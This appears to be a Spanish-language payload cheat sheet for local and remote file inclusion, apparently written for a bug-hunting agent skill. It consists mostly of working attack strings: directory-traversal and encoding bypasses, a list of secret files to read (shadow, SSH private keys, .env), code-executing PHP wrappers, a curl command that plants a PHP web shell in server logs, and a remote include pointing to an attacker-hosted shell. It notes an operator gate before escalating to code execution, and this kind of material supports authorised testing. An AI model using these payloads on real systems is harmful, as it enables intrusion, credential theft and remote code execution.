# LFI / RFI Payloads

> Ver `skills/hunt/lfi-rfi`. Evidencia: contenido de archivo real en la
> respuesta (o ejecución para RFI/wrappers).

## Path traversal básico

```
../../../../etc/passwd
....//....//....//etc/passwd          -- filtro que elimina "../" una vez
..%2f..%2f..%2fetc%2fpasswd           -- URL-encoded
..%252f..%252fetc%252fpasswd          -- double-encoded (tras proxy que decodifica)
..%c0%af..%c0%afetc/passwd            -- overlong UTF-8 (parsers legacy)
/etc/passwd                           -- path absoluto directo (a veces el filtro
                                        solo busca "..")
```

## Null byte / truncación (PHP legacy <5.3, algunos proxies)

```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg         -- cuando la app fuerza extensión
```

## Windows

```
..\..\..\windows\win.ini
../../../../windows/win.ini
C:\boot.ini
```

## Archivos de alto valor

```
/etc/passwd            /etc/shadow (si corre como root — raro)
/proc/self/environ     -- variables de entorno (secretos, paths)
/proc/self/cmdline     -- cómo arrancó el proceso
/proc/self/fd/N        -- file descriptors abiertos (logs, sockets)
/var/log/apache2/access.log   /var/log/nginx/access.log   -- log poisoning
/home/*/.ssh/id_rsa    -- claves privadas
wp-config.php (vía php filter)   config.php   .env
```

## PHP wrappers

```
php://filter/convert.base64-encode/resource=index.php   -- lee CÓDIGO FUENTE
php://filter/convert.base64-encode/resource=config.php
php://input                                  -- con body PHP → ejecución
data://text/plain,<?php system('id');?>      -- si allow_url_include
expect://id                                  -- si expect instalado
```

## Log poisoning → RCE

```
-- 1. Inyectar PHP en el log vía User-Agent:
curl -s https://target/ -A "<?php system(\$_GET['c']); ?>"
-- 2. Incluir el log:
?page=../../../../var/log/nginx/access.log&c=id
-- Variantes: /proc/self/environ (si UA se refleja ahí), sesiones PHP
   (/var/lib/php/sessions/sess_{PHPSESSID}), mails (sendmail log).
```

## RFI (raro hoy — allow_url_include off por defecto)

```
?page=http://{attacker}/shell.txt        -- shell.txt contiene <?php system($_GET['c']);?>
?page=http://{TOKEN}.oast.host/probe     -- mínimo: callback demuestra include remoto
```

## Gotchas de uso

- Contenido de `/etc/passwd` visible = LFI demostrado. No escalar a RCE sin
  gate de operador si implica ejecución.
- Respuesta vacía puede ser archivo sin permisos — probar /etc/hostname o
  win.ini como canarios legibles-casi-siempre.
- La app que sirve imágenes con `file=` a menudo procesa el contenido —
  validar content-type de la respuesta para distinguir LFI de proxy de imágenes.
